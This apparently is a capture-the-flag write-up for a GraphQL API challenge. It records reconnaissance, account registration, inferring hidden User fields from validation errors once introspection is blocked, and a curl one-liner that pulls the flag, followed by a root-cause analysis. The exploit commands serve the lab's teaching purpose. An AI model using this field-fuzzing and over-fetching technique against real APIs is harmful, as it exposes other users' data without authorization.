# Arclight - 1 — API Challenge Walkthrough

## Challenge Metadata

| Field | Value |
|---|---|
| Challenge | Arclight - 1 |
| Points | 20 |
| Category | API (GraphQL) |
| Target | `https://kicyber-574d89e4bc90-arclight1-0-0.chals.io` |
| Hints | "Every answer the directory gives you is one the UI decided you could see. The UI doesn't decide what the API returns. Ask it properly and see what falls out." |
| Flag | `KPMG_CTF{h1dd3n_f13ld_n0t_s0_h1dd3n}` |

---

## 1. Reconnaissance

### Initial request
The root path redirects to `/login`:

```
$ curl -s -i https://kicyber-574d89e4bc90-arclight1-0-0.chals.io/

HTTP/1.1 302 FOUND
Server: Werkzeug/3.1.9 Python/3.11.17
Location: /login
```

Technology fingerprint: **Flask (Werkzeug 3.1.9 / Python 3.11.17)** behind openresty.

Directory/endpoint sweep (all 404 except the app routes):

```
404  /api        404  /api/v1      404  /api/users   404  /users
404  /robots.txt 404  /swagger.json 404  /openapi.json 404  /api/me
404  /docs       404  /static      302  /dashboard   ...
```

### Register + Login
The app exposes `/register` and `/login` (HTML forms, POST with `username` / `password`).

```
$ curl -s -c cj.txt -b cj.txt -X POST .../register -d "username=hacker1&password=pass123"
register: 302 -> /login
$ curl -s -c cj.txt -b cj.txt -X POST .../login -d "username=hacker1&password=pass123"
login: 302 -> /dashboard
```

### Dashboard UI
The dashboard loads data from `/category/{name}` via JS:

```js
async function loadCategory(name) {
    const res = await fetch(`/category/${name}`);
    const data = await res.json();
    document.getElementById("output").textContent = JSON.stringify(data, null, 2);
}
```

Categories shown by the UI: `directory`, `projects`, `travel`, `developer`.

---

## 2. Enumerating the API — "Ask it properly"

Querying the four categories with an authenticated session:

```
=== /category/directory ===
[{"entries":5,"team":"Staff Directory"}]

=== /category/projects ===
[{"project":"Helios","status":"active"}]

=== /category/travel ===
[{"place":"Lisbon","status":"booked"}]

=== /category/developer ===
[{"note":"Internal directory API (GraphQL) is live at /graphql"}]
```

The UI only shows an *aggregate* answer for the directory (`entries: 5`).
The `developer` note reveals the real backend: **GraphQL at `/graphql`**.

---

## 3. GraphQL Discovery

### Querying the API directly (bypassing the UI "decision")

The UI only ever asked the API for the 5-entry count. Querying the API properly returns everything:

```
$ curl -s -b cj.txt -X POST .../graphql \
    -H "Content-Type: application/json" \
    -d '{"query":"{ users { id username email } }"}'

{"users":[{"email":"k.mercer@arclight.example","id":1,"username":"k.mercer"},
          {"email":"t.okafor@arclight.example","id":2,"username":"t.okafor"},
          {"email":"j.vance@arclight.example","id":3,"username":"j.vance"},
          {"email":"s.dial@arclight.example","id":4,"username":"s.dial"},
          {"email":"r.noe@arclight.example","id":5,"username":"r.noe"}]}
```

### Introspection is blocked by role

```
$ curl ... -d '{"query":"{ __schema { types { name kind fields { name } } } }"}'

{"error":"Introspection is not allowed for your role"}
```

So we fuzz candidate fields instead. GraphQL error messages tell us which fields exist:

```
{ me { ... } }            -> "Cannot query field 'me' on type 'Query'"
{ flag }                  -> "Cannot query field 'flag' on type 'Query'"
{ users { ... role flag password secret } }
  -> error only for 'password' and 'secret'
  -> **'role' and 'flag' are NOT errors  =>  they are valid fields on User**
```

---

## 4. Exploitation — Hidden fields on the User type

Query the hidden `role` and `flag` fields:

```
$ curl -s -b cj.txt -X POST .../graphql \
    -H "Content-Type: application/json" \
    -d '{"query":"{ users { id username email role flag } }"}'

{"users":[
  {"email":"k.mercer@arclight.example","flag":"KPMG_CTF{h1dd3n_f13ld_n0t_s0_h1dd3n}","id":1,"role":"admin","username":"k.mercer"},
  {"email":"t.okafor@arclight.example","flag":null,"id":2,"role":"user","username":"t.okafor"},
  {"email":"j.vance@arclight.example","flag":null,"id":3,"role":"user","username":"j.vance"},
  {"email":"s.dial@arclight.example","flag":null,"id":4,"role":"user","username":"s.dial"},
  {"email":"r.noe@arclight.example","flag":null,"id":5,"role":"user","username":"r.noe"}
]}
```

The `flag` field exists on the `User` object but the UI never requests it — it is hidden
only by the UI's query shape, not by the API's authorization. User `id: 1` (`k.mercer`, role
`admin`) carries the flag.

---

## 5. Root Cause

- **Vulnerability class:** GraphQL hidden/undocumented field exposure (missing field-level authorization / Over-Fetching).
- The `/category/directory` UI endpoint is an aggregate (`entries: 5`) — a deliberate mask.
- The underlying GraphQL schema exposes `role` and `flag` fields on `User` to *any* authenticated user.
- Introspection is disabled for normal roles, but that only hides the *schema*, not the *data*.
  Field-guessing through GraphQL validation errors reveals the hidden fields.

---

## 6. One-liner PoC

```
FLAG=$(curl -s -b /tmp/opencode/cj.txt -X POST https://kicyber-574d89e4bc90-arclight1-0-0.chals.io/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ users { id username email role flag } }"}' | jq -r '.users[] | select(.flag != null) | .flag')
echo "$FLAG"
```

## Flag

```
KPMG_CTF{h1dd3n_f13ld_n0t_s0_h1dd3n}
```

---

## Evidence Files (in `Arclight1/evidence/`)

| File | Contents |
|---|---|
| `01_category_directory.json` | UI response — only for the `directory` category, shows only `entries: 5` |
| `02_category_projects.json` | `projects` category response |
| `03_category_travel.json` | `travel` category response |
| `04_category_developer_graphql_note.json` | reveals GraphQL live at `/graphql` |
| `05_graphql_introspection_denied.json` | introspection blocked for normal role |
| `06_graphql_hidden_fields_flag.json` | full `users` query with hidden `role` + `flag` fields → **flag** |

See also `../Arclight-2-SOLVED.md` for the second stage (access-request privilege escalation).